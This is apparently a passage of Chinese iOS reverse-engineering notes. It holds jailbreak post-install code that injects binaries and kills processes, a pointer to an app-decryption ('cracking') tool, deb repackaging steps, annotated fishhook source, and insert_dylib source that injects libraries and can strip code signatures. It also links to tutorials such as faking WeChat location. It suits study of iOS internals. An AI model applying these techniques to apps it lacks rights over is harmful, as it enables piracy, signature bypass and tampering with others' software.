                    moveFile("/var/containers/Bundle/tweaksupport/usr/libexec/filza/Sharing", "/var/containers/Bundle/tweaksupport/Applications/Filza.app/PlugIns/Sharing.appex/Sharing");
                    system_("/var/containers/Bundle/tweaksupport/usr/bin/inject /var/containers/Bundle/tweaksupport/Applications/Filza.app/PlugIns/Sharing.appex/Sharing");
                    
                    launch("/var/containers/Bundle/iosbinpack64/bin/launchctl", "unload", "/var/containers/Bundle/iosbinpack64/LaunchDaemons/com.tigisoftware.filza.helper.plist", NULL, NULL, NULL, NULL, NULL);
                    
                    launch("/var/containers/Bundle/iosbinpack64/bin/launchctl", "load", "-w", "/var/containers/Bundle/iosbinpack64/LaunchDaemons/com.tigisoftware.filza.helper.plist", NULL, NULL, NULL, NULL);
                    
                    mkdir("/var/containers/Bundle/tweaksupport/data", 0777);
                    removeFile("/var/containers/Bundle/tweaksupport/data/Filza.app");
                    copyFile("/var/containers/Bundle/tweaksupport/Applications/Filza.app", "/var/containers/Bundle/tweaksupport/data/Filza.app");
                    
                    removeFile("/var/LIB/MobileSubstrate/DynamicLibraries/Filza");
                    removeFile("/var/LIB/MobileSubstrate/DynamicLibraries/Sharing");
                    removeFile("/var/LIB/MobileSubstrate/DynamicLibraries/libsmb2-ios.dylib");
                    
                    copyFile("/var/containers/Bundle/tweaksupport/Applications/Filza.app/Filza", "/var/LIB/MobileSubstrate/DynamicLibraries/Filza");
                    copyFile("/var/containers/Bundle/tweaksupport/Applications/Filza.app/PlugIns/Sharing.appex/Sharing", "/var/LIB/MobileSubstrate/DynamicLibraries/Sharing");
                    copyFile("/var/containers/Bundle/tweaksupport/Applications/Filza.app/dylibs/libsmb2-ios.dylib", "/var/LIB/MobileSubstrate/DynamicLibraries/libsmb2-ios.dylib");
                    
                    // just in case
                    fixMmap("/var/ulb/libsubstitute.dylib");
                    fixMmap("/var/LIB/Frameworks/CydiaSubstrate.framework/CydiaSubstrate");
                    fixMmap("/var/LIB/MobileSubstrate/DynamicLibraries/AppSyncUnified.dylib");
                    
                    failIf(launch("/var/containers/Bundle/tweaksupport/usr/bin/uicache", NULL, NULL, NULL, NULL, NULL, NULL, NULL), "[-] Failed to install Filza File Manager");
                    
                }
                
                dispatch_async(dispatch_get_main_queue(), ^{
                    [self->_jbtext setTitle:@"26/27" forState:UIControlStateNormal];
                });
                
                NSArray *tweaks = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/ulb/TweakInject" error:NULL];
                for (NSString *afile in tweaks) {
                    if ([afile hasSuffix:@"plist"]) {
                        
                        NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:[NSString stringWithFormat:@"/var/ulb/TweakInject/%@",afile]];
                        NSString *dylibPath = [afile stringByReplacingOccurrencesOfString:@".plist" withString:@".dylib"];
                        fixMmap((char *)[[NSString stringWithFormat:@"/var/ulb/TweakInject/%@", dylibPath] UTF8String]);
                        NSArray *executables = [[plist objectForKey:@"Filter"] objectForKey:@"Executables"];
                        
                        for (NSString *processName in executables) {
                            if (![processName isEqual:@"SpringBoard"] && ![processName isEqual:@"backboardd"] && ![processName isEqual:@"assertiond"] && ![processName isEqual:@"launchd"]) { //really?
                                int procpid = pid_of_procName((char *)[processName UTF8String]);
                                if (procpid) {
                                    kill(procpid, SIGKILL);
                                }
                            }
                        }
                        
                        NSArray *bundles = [[plist objectForKey:@"Filter"] objectForKey:@"Bundles"];
                        for (NSString *bundleID in bundles) {
                            if (![bundleID isEqual:@"com.apple.springboard"] && ![bundleID isEqual:@"com.apple.backboardd"] && ![bundleID isEqual:@"com.apple.assertiond"] && ![bundleID isEqual:@"com.apple.launchd"]) {
                                NSString *processName = [bundleID stringByReplacingOccurrencesOfString:@"com.apple." withString:@""];
                                int procpid = pid_of_procName((char *)[processName UTF8String]);
                                if (procpid) {
                                    kill(procpid, SIGKILL);
                                }
                            }
                            
                        }
                    }
                }
                
                dispatch_async(dispatch_get_main_queue(), ^{
                    [self->_jbtext setTitle:@"27/27" forState:UIControlStateNormal];
                });
                
                // find which applications are jailbreak applications and inject their executable
                NSArray *applications = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/containers/Bundle/Application/" error:NULL];
                
                for (NSString *string in applications) {
                    NSString *fullPath = [@"/var/containers/Bundle/Application/" stringByAppendingString:string];
                    NSArray *innerContents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:fullPath error:NULL];
                    for (NSString *innerFile in innerContents) {
                        if ([innerFile hasSuffix:@"app"]) {
                            
                            NSString *fullAppBundlePath = [fullPath stringByAppendingString:[NSString stringWithFormat:@"/%@",innerFile]];
                            NSString *_CodeSignature = [fullPath stringByAppendingString:[NSString stringWithFormat:@"/%@/_CodeSignature",innerFile]];
                            
                            NSDictionary *infoPlist = [NSDictionary dictionaryWithContentsOfFile:[NSString stringWithFormat:@"%@/Info.plist",fullAppBundlePath]];
                            NSString *executable = [infoPlist objectForKey:@"CFBundleExecutable"];
                            NSString *BuildMachineOSBuild = [infoPlist objectForKey:@"BuildMachineOSBuild"];
                            BOOL hasDTCompilerRelatedKeys=NO;
                            for (NSString *KEY in [infoPlist allKeys]) {
                                if ([KEY rangeOfString:@"DT"].location==0) {
                                    hasDTCompilerRelatedKeys=YES;
                                    break;
                                }
                            }
                            // check for keys added by native/appstore apps and exclude (theos and friends don't add BuildMachineOSBuild and DT_ on apps :-D )
                            // Xcode-added apps set CFBundleExecutable=Executable, exclude them too
                            
                            executable = [NSString stringWithFormat:@"%@/%@", fullAppBundlePath, executable];
                            
                            if (([[NSFileManager defaultManager] fileExistsAtPath:[NSString stringWithFormat:@"%@/.jb",fullAppBundlePath]] || ![[NSFileManager defaultManager] fileExistsAtPath:_CodeSignature] || (executable && ![executable isEqual:@"Executable"] && !BuildMachineOSBuild & !hasDTCompilerRelatedKeys)) && fileExists([executable UTF8String])) {
                                
                                LOG("Injecting executable %s",[executable UTF8String]);
                                system_((char *)[[NSString stringWithFormat:@"/var/containers/Bundle/iosbinpack64/usr/bin/inject %s", [executable UTF8String]] UTF8String]);
                            }
                            
                        }
                    }
                }
                dispatch_async(dispatch_get_main_queue(), ^{
                    [self->_jbtext setTitle:@"Done!" forState:UIControlStateNormal];
                    
                });
                LOG("[+] Really jailbroken!");
                term_jelbrek();
                kill(bb, 9);
                exit(0);
            }
        });
}

@end

```

# iOS12及以上砸壳工具CrackerXI+的使用方法  
## 纯手机端傻瓜式操作: https://www.jianshu.com/p/97a97ff81384
![CrackerXI+](https://upload-images.jianshu.io/upload_images/1155391-056769989ae6fc8d.PNG?imageMogr2/auto-orient/strip|imageView2/2/w/750/format/webp)

## 出于多种原因，有的时候需要直接对deb包中的各种文件内容进行修改，例如：在没有源代码的情况下的修改，还有破解的时候
```
那么就有三个问题需要解决：
0、如何将deb包文件进行解包呢？
1、修改要修改的文件？
2、对修改后的内容进行生成deb包？
```

```
解决方法：
-0、准备工作：
mkdir xlsn0w
mkdir xlsn0w/DEBIAN
mkdir build

0、解包命令为：

#解压出包中的文件到xlsn0w目录下
dpkg -X ../name.deb xlsn0w/

#解压出包的控制信息xlsn0w/DEBIAN/下：
dpkg -e ../name.deb xlsn0w/DEBIAN/ 

1、修改文件(此处以修改ssh连接时禁止以root身份进行远程登录，原来是能够以root登录的)：
sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' extract/etc/ssh/sshd_config

2、对修改后的内容重新进行打包生成deb包
dpkg-deb -b xlsn0w/ build/

~$ ll build/
总用量 1016

验证方法为：再次解开重新打包的deb文件，查看在etc/ssh/sshd_config文件是否已经被修改；
```
## 响应式编程（Reactive Programming）是一种编程思想，相对应的也有面向过程编程、面向对象编程、函数式编程等等。不同的是，响应式编程的核心是面向异步数据流和变化的。

 在现在的前端世界中，我们需要处理大量的事件，既有用户的交互，也有不断的网络请求，还有来自系统或者框架的各种通知，因此也无可避免产生纷繁复杂的状态。
 使用响应式编程后，所有事件将成为异步的数据流，更加方便的是可以对这些数据流可以进行组合变换，最终我们只需要监听所关心的数据流的变化并做出响应即可。

# 分析fishhook
## fishhook_h
```
#ifndef fishhook_h
#define fishhook_h

#include <stddef.h>
#include <stdint.h>

#if !defined(FISHHOOK_EXPORT)
#define FISHHOOK_VISIBILITY __attribute__((visibility("hidden")))
#else
#define FISHHOOK_VISIBILITY __attribute__((visibility("default")))
#endif

#ifdef __cplusplus
extern "C" {
#endif //__cplusplus

/*
 * A structure representing a particular intended rebinding from a symbol
 * name to its replacement
 */
struct rebinding {
  const char *name;      // 需要替换的函数名
  void *replacement;     // 新函数的指针
  void **replaced;       // 老函数的新指针
};

/*
 * For each rebinding in rebindings, rebinds references to external, indirect
 * symbols with the specified name to instead point at replacement for each
 * image in the calling process as well as for all future images that are loaded
 * by the process. If rebind_functions is called more than once, the symbols to
 * rebind are added to the existing list of rebindings, and if a given symbol
 * is rebound more than once, the later rebinding will take precedence.
 */
FISHHOOK_VISIBILITY
int rebind_symbols(struct rebinding rebindings[], size_t rebindings_nel);

/*
 * Rebinds as above, but only in the specified image. The header should point
 * to the mach-o header, the slide should be the slide offset. Others as above.
 */
FISHHOOK_VISIBILITY
int rebind_symbols_image(void *header,
                         intptr_t slide,
                         struct rebinding rebindings[],
                         size_t rebindings_nel);

#ifdef __cplusplus
}
#endif //__cplusplus

#endif //fishhook_h
```
## fishhook.c
```
#include "fishhook.h"

#include <dlfcn.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>

#ifdef __LP64__
typedef struct mach_header_64 mach_header_t;
typedef struct segment_command_64 segment_command_t;
typedef struct section_64 section_t;
typedef struct nlist_64 nlist_t;
#define LC_SEGMENT_ARCH_DEPENDENT LC_SEGMENT_64
#else
typedef struct mach_header mach_header_t;
typedef struct segment_command segment_command_t;
typedef struct section section_t;
typedef struct nlist nlist_t;
#define LC_SEGMENT_ARCH_DEPENDENT LC_SEGMENT
#endif

#ifndef SEG_DATA_CONST
#define SEG_DATA_CONST  "__DATA_CONST"
#endif

struct rebindings_entry {
    struct rebinding *rebindings;
    size_t rebindings_nel;
    struct rebindings_entry *next;
};

static struct rebindings_entry *_rebindings_head;

// 给需要rebinding的方法结构体开辟出对应的空间
// 生成对应的链表结构（rebindings_entry）
static int prepend_rebindings(struct rebindings_entry **rebindings_head,
                              struct rebinding rebindings[],
                              size_t nel) {
    // 开辟一个rebindings_entry大小的空间
    struct rebindings_entry *new_entry = (struct rebindings_entry *) malloc(sizeof(struct rebindings_entry));
    if (!new_entry) {
        return -1;
    }
    // 一共有nel个rebinding
    new_entry->rebindings = (struct rebinding *) malloc(sizeof(struct rebinding) * nel);
    if (!new_entry->rebindings) {
        free(new_entry);
        return -1;
    }
    // 将rebinding赋值给new_entry->rebindings
    memcpy(new_entry->rebindings, rebindings, sizeof(struct rebinding) * nel);
    // 继续赋值nel
    new_entry->rebindings_nel = nel;
    // 每次都将new_entry插入头部
    new_entry->next = *rebindings_head;
    // rebindings_head重新指向头部
    *rebindings_head = new_entry;
    return 0;
}

static void perform_rebinding_with_section(struct rebindings_entry *rebindings,
                                           section_t *section,
                                           intptr_t slide,
                                           nlist_t *symtab,
                                           char *strtab,
                                           uint32_t *indirect_symtab) {
    // reserved1对应的的是indirect_symbol中的offset，也就是indirect_symbol的真实地址
    // indirect_symtab+offset就是indirect_symbol_indices(indirect_symbol的数组)
    uint32_t *indirect_symbol_indices = indirect_symtab + section->reserved1;
    // 函数地址，addr就是section的偏移地址
    void **indirect_symbol_bindings = (void **)((uintptr_t)slide + section->addr);
    // 遍历section中的每个符号
    for (uint i = 0; i < section->size / sizeof(void *); i++) {
        // 访问indirect_symbol，symtab_index就是indirect_symbol中data的值
        uint32_t symtab_index = indirect_symbol_indices[i];
        if (symtab_index == INDIRECT_SYMBOL_ABS || symtab_index == INDIRECT_SYMBOL_LOCAL ||
            symtab_index == (INDIRECT_SYMBOL_LOCAL   | INDIRECT_SYMBOL_ABS)) {
            continue;
        }
        // 访问symbol_table，根据symtab_index获取到symbol_table中的偏移offset
        uint32_t strtab_offset = symtab[symtab_index].n_un.n_strx;
        // 访问string_table，根据strtab_offset获取symbol_name
        char *symbol_name = strtab + strtab_offset;
        // string_table中的所有函数名都是以"."开始的，所以一个函数一定有两个字符
        bool symbol_name_longer_than_1 = symbol_name[0] && symbol_name[1];
        struct rebindings_entry *cur = rebindings;
        // 已经存入的rebindings_entry
        while (cur) {
            // 循环每个entry中需要重绑定的函数
            for (uint j = 0; j < cur->rebindings_nel; j++) {
                // 判断symbol_name是否是一个正确的函数名
                // 需要被重绑定的函数名是否与当前symbol_name相等
                if (symbol_name_longer_than_1 &&
                    strcmp(&symbol_name[1], cur->rebindings[j].name) == 0) {
                    // 判断replaced是否存在
                    // 判断replaced和老的函数是否是一样的
                    if (cur->rebindings[j].replaced != NULL &&
                        indirect_symbol_bindings[i] != cur->rebindings[j].replacement) {
                        // 将原函数的地址给新函数replaced
                        *(cur->rebindings[j].replaced) = indirect_symbol_bindings[i];
                    }
                    // 将replacement赋值给刚刚找到的
                    indirect_symbol_bindings[i] = cur->rebindings[j].replacement;
                    goto symbol_loop;
                }
            }
            // 继续下一个需要绑定的函数
            cur = cur->next;
        }
    symbol_loop:;
    }
}

static void rebind_symbols_for_image(struct rebindings_entry *rebindings,
                                     const struct mach_header *header,
                                     intptr_t slide) {
    Dl_info info;
    // 判断当前macho是否在进程里，如果不在则直接返回
    if (dladdr(header, &info) == 0) {
        return;
    }
    
    // 定义好几个变量，后面去遍历查找
    segment_command_t *cur_seg_cmd;
    // MachO中Load Commons中的linkedit
    segment_command_t *linkedit_segment = NULL;
    // MachO中LC_SYMTAB
    struct symtab_command* symtab_cmd = NULL;
    // MachO中LC_DYSYMTAB
    struct dysymtab_command* dysymtab_cmd = NULL;
    
    // header的首地址+mach_header的内存大小
    // 得到跳过mach_header的地址,也就是直接到Load Commons的地址
    uintptr_t cur = (uintptr_t)header + sizeof(mach_header_t);
    // 遍历Load Commons 找到上面三个遍历
    for (uint i = 0; i < header->ncmds; i++, cur += cur_seg_cmd->cmdsize) {
        cur_seg_cmd = (segment_command_t *)cur;
        // 如果是LC_SEGMENT_64
        if (cur_seg_cmd->cmd == LC_SEGMENT_ARCH_DEPENDENT) {
            // 找到linkedit
            if (strcmp(cur_seg_cmd->segname, SEG_LINKEDIT) == 0) {
                linkedit_segment = cur_seg_cmd;
            }
        }
        // 如果是LC_SYMTAB,就找到了symtab_cmd
        else if (cur_seg_cmd->cmd == LC_SYMTAB) {
            symtab_cmd = (struct symtab_command*)cur_seg_cmd;
        }
        // 如果是LC_DYSYMTAB,就找到了dysymtab_cmd
        else if (cur_seg_cmd->cmd == LC_DYSYMTAB) {
            dysymtab_cmd = (struct dysymtab_command*)cur_seg_cmd;
        }
    }
    // 下面其中任何一个值没有都直接return
    // 因为image不是需要找的image
    if (!symtab_cmd || !dysymtab_cmd || !linkedit_segment ||
        !dysymtab_cmd->nindirectsyms) {
        return;
    }
    
    // Find base symbol/string table addresses
    // 找到linkedit的头地址
    // linkedit_base其实就是MachO的头地址！！！可以通过查看linkedit_base值和image list命令查看验证！！！
    /**********************************************************
     Linkedit虚拟地址 = PAGEZERO(64位下1G) + FileOffset
     MachO地址 = PAGEZERO + ASLR
     上面两个公式是已知的 得到下面这个公式
     MachO文件地址 = Linkedit虚拟地址 - FileOffset + ASLR(slide)
     **********************************************************/
    uintptr_t linkedit_base = (uintptr_t)slide + linkedit_segment->vmaddr - linkedit_segment->fileoff;
    // 获取symbol_table的真实地址
    nlist_t *symtab = (nlist_t *)(linkedit_base + symtab_cmd->symoff);
    // 获取string_table的真实地址
    char *strtab = (char *)(linkedit_base + symtab_cmd->stroff);
    
    // Get indirect symbol table (array of uint32_t indices into symbol table)
    // 获取indirect_symtab的真实地址
    uint32_t *indirect_symtab = (uint32_t *)(linkedit_base + dysymtab_cmd->indirectsymoff);
    // 同样的，得到跳过mach_header的地址,得到Load Commons的地址
    cur = (uintptr_t)header + sizeof(mach_header_t);
    // 遍历Load Commons，找到对应符号进行重新绑定
    for (uint i = 0; i < header->ncmds; i++, cur += cur_seg_cmd->cmdsize) {
        cur_seg_cmd = (segment_command_t *)cur;
        if (cur_seg_cmd->cmd == LC_SEGMENT_ARCH_DEPENDENT) {
            // 如果不是__DATA段，也不是__DATA_CONST段，直接跳过
            if (strcmp(cur_seg_cmd->segname, SEG_DATA) != 0 &&
                strcmp(cur_seg_cmd->segname, SEG_DATA_CONST) != 0) {
                continue;
            }
            // 遍历所有的segment
            for (uint j = 0; j < cur_seg_cmd->nsects; j++) {
                section_t *sect =
                (section_t *)(cur + sizeof(segment_command_t)) + j;
                // 找懒加载表S_LAZY_SYMBOL_POINTERS
                if ((sect->flags & SECTION_TYPE) == S_LAZY_SYMBOL_POINTERS) {
                    // 重绑定的真正函数
                    perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);
                }
                // 找非懒加载表S_NON_LAZY_SYMBOL_POINTERS
                if ((sect->flags & SECTION_TYPE) == S_NON_LAZY_SYMBOL_POINTERS) {
                    // 重绑定的真正函数
                    perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);
                }
            }
        }
    }
}

static void _rebind_symbols_for_image(const struct mach_header *header,
                                      intptr_t slide) {
    // 找到对应的符号，进行重绑定
    rebind_symbols_for_image(_rebindings_head, header, slide);
}

// 在知道确定的MachO，可以使用该方法
int rebind_symbols_image(void *header,
                         intptr_t slide,
                         struct rebinding rebindings[],
                         size_t rebindings_nel) {
    struct rebindings_entry *rebindings_head = NULL;
    int retval = prepend_rebindings(&rebindings_head, rebindings, rebindings_nel);
    rebind_symbols_for_image(rebindings_head, (const struct mach_header *) header, slide);
    if (rebindings_head) {
        free(rebindings_head->rebindings);
    }
    free(rebindings_head);
    return retval;
}

int rebind_symbols(struct rebinding rebindings[], size_t rebindings_nel) {
    int retval = prepend_rebindings(&_rebindings_head, rebindings, rebindings_nel);
    if (retval < 0) {
        return retval;
    }
    // If this was the first call, register callback for image additions (which is also invoked for
    // existing images, otherwise, just run on existing images
    if (!_rebindings_head->next) {
        // 向每个image注册_rebind_symbols_for_image函数，并且立即触发一次
        _dyld_register_func_for_add_image(_rebind_symbols_for_image);
    } else {
        // _dyld_image_count() 获取image数量
        uint32_t c = _dyld_image_count();
        for (uint32_t i = 0; i < c; i++) {
            // _dyld_get_image_header(i) 获取第i个image的header指针
            // _dyld_get_image_vmaddr_slide(i) 获取第i个image的基址
            _rebind_symbols_for_image(_dyld_get_image_header(i), _dyld_get_image_vmaddr_slide(i));
        }
    }
    return retval;
}

```
```
在 Mac 和 iOS 上，有一个名为 mach_vm_read_overwrite 的低级函数. 
这个函数可以在其中指定两个指针以及从一个指针复制到另一个指针的字节数.
这是一个系统调用, 即调用是在内核级别执行的, 因此可以安全地检查它并返回错误.
下面是函数原型, 它接受一个任务, 就像一个进程, 如果你有正确的权限, 你可以从其他进程读取.

public func mach_vm_read_overwrite(
      _ target_task: vm_map_t,
      _ address: mach_vm_address_t,
      _ size: mach_vm_size_t,
      _ data: mach_vm_address_t,
      _ outsize: UnsafeMutablePointer<mach_vm_size_t>!)
  -> kern_return_t
  
  该函数接受一个源地址, 一个长度, 一个目标地址和一个指向长度的指针，它会告诉你它实际读取了多少字节
  
  例如Clutch借助mach_vm_read_overwrite函数来读取指定进程空间中的任意虚拟内存区域中所存储的内容。
  
```

### fishhook例子
```
- (void)rebindingFunction {
    struct rebinding nslog;
    nslog.name = "NSLog";
    nslog.replacement = XLsn0wLog;
    nslog.replaced = (void *)&sys_nslog;
    struct rebinding rebs[1] = {nslog};
    rebind_symbols(rebs, 1);
}

//------------------XLsn0wLog替换NSLog------------------
//函数指针
static void(*sys_nslog)(NSString * format,...);

//定义一个新的函数
void XLsn0wLog(NSString * format,...){
    format = [format stringByAppendingString:@"你咋又来了 \n"];
    //调用原始的
    sys_nslog(format);
}
```

```
//注入动态库

// ./insert_dylib @executable_path(表示加载bin所在目录)/inject.dylib test

#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/stat.h>
#include <copyfile.h>
#include <mach-o/loader.h>
#include <mach-o/fat.h>

#define IS_64_BIT(x) ((x) == MH_MAGIC_64 || (x) == MH_CIGAM_64)
#define IS_LITTLE_ENDIAN(x) ((x) == FAT_CIGAM || (x) == MH_CIGAM_64 || (x) == MH_CIGAM)
#define SWAP32(x, magic) (IS_LITTLE_ENDIAN(magic)? OSSwapInt32(x): (x))

__attribute__((noreturn)) void usage(void) {
    printf("Usage: insert_dylib [--inplace] [--weak] dylib_path binary_path [new_path]\n");
    
    exit(1);
}

__attribute__((format(printf, 1, 2))) bool ask(const char *format, ...) {
    char *question;
    asprintf(&question, "%s [y/n] ", format);
    
    va_list args;
    va_start(args, format);
    vprintf(question, args);
    va_end(args);
    
    free(question);
    
    while(true) {
        char *line = NULL;
        size_t size;
        getline(&line, &size, stdin);
        
        switch(line[0]) {
            case 'y':
            case 'Y':
                return true;
                break;
            case 'n':
            case 'N':
                return false;
                break;
            default:
                printf("Please enter y or n: ");
        }
    }
}

void remove_code_signature(FILE *f, struct mach_header *mh, size_t header_offset, size_t commands_offset) {
    fseek(f, commands_offset, SEEK_SET);
    
    uint32_t ncmds = SWAP32(mh->ncmds, mh->magic);
    
    for(int i = 0; i < ncmds; i++) {
        struct load_command lc;
        fread(&lc, sizeof(lc), 1, f);
        
        if(SWAP32(lc.cmd, mh->magic) == LC_CODE_SIGNATURE) {
            if(i == ncmds - 1 && ask("LC_CODE_SIGNATURE load command found. Remove it?")) {
                fseek(f, -((long)sizeof(lc)), SEEK_CUR);
                
                struct linkedit_data_command ldc;
                fread(&ldc, sizeof(ldc), 1, f);
                
                uint32_t cmdsize = SWAP32(ldc.cmdsize, mh->magic);
                uint32_t dataoff = SWAP32(ldc.dataoff, mh->magic);
                uint32_t datasize = SWAP32(ldc.datasize, mh->magic);
                
                fseek(f, -((long)sizeof(ldc)), SEEK_CUR);
                
                char *zero = calloc(cmdsize, 1);
                fwrite(zero, cmdsize, 1, f);
                free(zero);
                
                fseek(f, header_offset + dataoff, SEEK_SET);
                
                zero = calloc(datasize, 1);
                fwrite(zero, datasize, 1, f);
                free(zero);
                
                mh->ncmds = SWAP32(ncmds - 1, mh->magic);
                mh->sizeofcmds = SWAP32(SWAP32(mh->sizeofcmds, mh->magic) - ldc.cmdsize, mh->magic);
                
                return;
            } else {
                printf("LC_CODE_SIGNATURE is not the last load command, so couldn't remove.");
            }
        }
        
        fseek(f, SWAP32(lc.cmdsize, mh->magic) - sizeof(lc), SEEK_CUR);
    }
}

bool insert_dylib(FILE *f, size_t header_offset, const char *dylib_path, bool weak) {
    fseek(f, header_offset, SEEK_SET);
    
    struct mach_header mh;
    fread(&mh, sizeof(struct mach_header), 1, f);
    
    if(mh.magic != MH_MAGIC_64 && mh.magic != MH_CIGAM_64 && mh.magic != MH_MAGIC && mh.magic != MH_CIGAM) {
        printf("Unknown magic: 0x%x\n", mh.magic);
        return false;
    }
    
    size_t commands_offset = header_offset + (IS_64_BIT(mh.magic)? sizeof(struct mach_header_64): sizeof(struct mach_header));
    
    // 屏蔽了此处代码，如果将Mach-O中Load_Signature去掉，后面重签名会出错，需要保留
//    remove_code_signature(f, &mh, header_offset, commands_offset);
    
    size_t dylib_path_len = strlen(dylib_path);
    size_t dylib_path_size = (dylib_path_len & ~3) + 4;
    uint32_t cmdsize = (uint32_t)(sizeof(struct dylib_command) + dylib_path_size);
    
    struct dylib_command dylib_command = {
        .cmd = SWAP32(weak? LC_LOAD_WEAK_DYLIB: LC_LOAD_DYLIB, mh.magic),
        .cmdsize = SWAP32(cmdsize, mh.magic),
        .dylib = {
            .name = SWAP32(sizeof(struct dylib_command), mh.magic),
            .timestamp = 0,
            .current_version = 0,
            .compatibility_version = 0
        }
    };
    
    uint32_t sizeofcmds = SWAP32(mh.sizeofcmds, mh.magic);
    
    fseek(f, commands_offset + sizeofcmds, SEEK_SET);
    char space[cmdsize];
    
    fread(&space, cmdsize, 1, f);
    
    bool empty = true;
    for(int i = 0; i < cmdsize; i++) {
        if(space[i] != 0) {
            empty = false;
            break;
        }
    }
    
    if(!empty) {
        if(!ask("It doesn't seem like there is enough empty space. Continue anyway?")) {
            return false;
        }
    }
    
    fseek(f, -((long)cmdsize), SEEK_CUR);
    
    char *dylib_path_padded = calloc(dylib_path_size, 1);
    memcpy(dylib_path_padded, dylib_path, dylib_path_len);
    
    fwrite(&dylib_command, sizeof(dylib_command), 1, f);
    fwrite(dylib_path_padded, dylib_path_size, 1, f);
    
    free(dylib_path_padded);
    
    mh.ncmds = SWAP32(SWAP32(mh.ncmds, mh.magic) + 1, mh.magic);
    sizeofcmds += cmdsize;
    mh.sizeofcmds = SWAP32(sizeofcmds, mh.magic);
    
    fseek(f, header_offset, SEEK_SET);
    fwrite(&mh, sizeof(mh), 1, f);
    
    return true;
}

int main(int argc, const char *argv[]) {
    int inplace = false;
    int weak = false;
    
    struct option long_options[] = {
        {"inplace", no_argument, &inplace, true},
        {"weak",    no_argument, &weak,    true}
    };
    
    while(true) {
        int option_index = 0;
        
        int c = getopt_long(argc, (char *const *)argv, "", long_options, &option_index);
        
        if(c == -1) {
            break;
        }
        
        switch(c) {
            case 0:
                break;
            case '?':
                usage();
                break;
            default:
                abort();
                break;
        }
    }
    
    argv = &argv[optind - 1];
    argc -= optind - 1;
    
    if(argc < 3 || argc > 4) {
        usage();
    }
    
    const char *lc_name = weak? "LC_LOAD_WEAK_DYLIB": "LC_LOAD_DYLIB";
    
    const char *dylib_path = argv[1];
    const char *binary_path = argv[2];
    
    struct stat s;
    
    if(stat(binary_path, &s) != 0) {
        perror(binary_path);
        exit(1);
    }
    
    if(stat(dylib_path, &s) != 0) {
        if(!ask("The provided dylib path doesn't exist. Continue anyway?")) {
            exit(1);
        }
    }
    
    bool binary_path_was_malloced = false;
    if(!inplace) {
        char *new_binary_path;
        if(argc == 4) {
            new_binary_path = (char *)argv[3];
        } else {
            asprintf(&new_binary_path, "%s_patched", binary_path);
            binary_path_was_malloced = true;
        }
        
        if(stat(new_binary_path, &s) == 0) {
            if(!ask("%s already exists. Overwrite it?", new_binary_path)) {
                exit(1);
            }
        }
        
        if(copyfile(binary_path, new_binary_path, NULL, COPYFILE_DATA | COPYFILE_UNLINK)) {
            printf("Failed to create %s\n", new_binary_path);
            exit(1);
        }
        
        binary_path = new_binary_path;
    }
    
    FILE *f = fopen(binary_path, "r+");
    
    if(!f) {
        printf("Couldn't open file %s\n", argv[1]);
        exit(1);
    }
    
    bool success = true;
    
    uint32_t magic;
    fread(&magic, sizeof(uint32_t), 1, f);
    
    switch(magic) {
        case FAT_MAGIC:
        case FAT_CIGAM: {
            fseek(f, 0, SEEK_SET);
            
            struct fat_header fh;
            fread(&fh, sizeof(struct fat_header), 1, f);
            
            uint32_t nfat_arch = SWAP32(fh.nfat_arch, magic);
            
            printf("Binary is a fat binary with %d archs.\n", nfat_arch);
            
            struct fat_arch archs[nfat_arch];
            fread(&archs, sizeof(archs), 1, f);
            
            int fails = 0;
            
            for(int i = 0; i < nfat_arch; i++) {
                bool r = insert_dylib(f, SWAP32(archs[i].offset, magic), dylib_path, weak);
                if(!r) {
                    printf("Failed to add %s to arch #%d!\n", lc_name, i + 1);
                    fails++;
                }
            }
            
            if(fails == 0) {
                printf("Added %s to all archs in %s\n", lc_name, binary_path);
            } else if(fails == nfat_arch) {
                printf("Failed to add %s to any archs.\n", lc_name);
                success = false;
            } else {
                printf("Added %s to %d/%d archs in %s\n", lc_name, nfat_arch - fails, nfat_arch, binary_path);
            }
            
            break;
        }
        case MH_MAGIC_64:
        case MH_CIGAM_64:
        case MH_MAGIC:
        case MH_CIGAM:
            if(insert_dylib(f, 0, dylib_path, weak)) {
                printf("Added %s to %s\n", lc_name, binary_path);
            } else {
                printf("Failed to add %s!\n", lc_name);
                success = false;
            }
            break;
        default:
            printf("Unknown magic: 0x%x\n", magic);
            exit(1);
    }
    
    fclose(f);
    
    if(!success) {
        if(!inplace) {
            unlink(binary_path);
        }
        exit(1);
    }
    
    if(binary_path_was_malloced) {
        free((void *)binary_path);
    }
    
    return 0;
}

```

# iOS 逆向开发资料

介绍
https://zh.wikipedia.org/wiki/Cydia

网址
https://cydia.saurik.com/

OpenSSH
https://cydia.saurik.com/openssh.html

usbmuxd
http://bbs.iosre.com/t/usb-ssh-ios/193

scp
http://ged.msu.edu/angus/tutorials/using-ssh-scp-terminal-macosx.html

Cycript
http://www.cycript.org/

IDA
https://www.hex-rays.com/products/ida/support/download_demo.shtml

Hopper
https://www.hopperapp.com/

iOS逆向工程之Hopper中的ARM指令
http://www.cnblogs.com/ludashi/p/5740696.html

Theos
http://iphonedevwiki.net/index.php/Theos/Setup#For_Mac_OS_X

Logos
http://iphonedevwiki.net/index.php/Logos

Tutorial: Install the latest Theos step by step
http://bbs.iosre.com/t/tutorial-install-the-latest-theos-step-by-step/2753

Theos：iOS越狱程序开发框架
http://security.ios-wiki.com/issue-3-6/

iOS逆向工程之Theos
http://www.cnblogs.com/ludashi/p/5714095.html

iOS逆向入门实践 — 逆向微信，伪装定位(一)
http://pandara.xyz/2016/08/13/fake_wechat_location/

iOS逆向入门实践 — 逆向微信，伪装定位(二)
http://pandara.xyz/2016/08/14/fake_wechat_location2/
iOSOpenDev

iOSOpenDev
http://iosopendev.com/

iOSOpenDev & 应用重签名 & iOSAppHook 等
https://github.com/Urinx/iOSAppHook

iOS App 签名的原理
http://blog.cnbang.net/tech/3386/

iOS安全些许经验和学习笔记
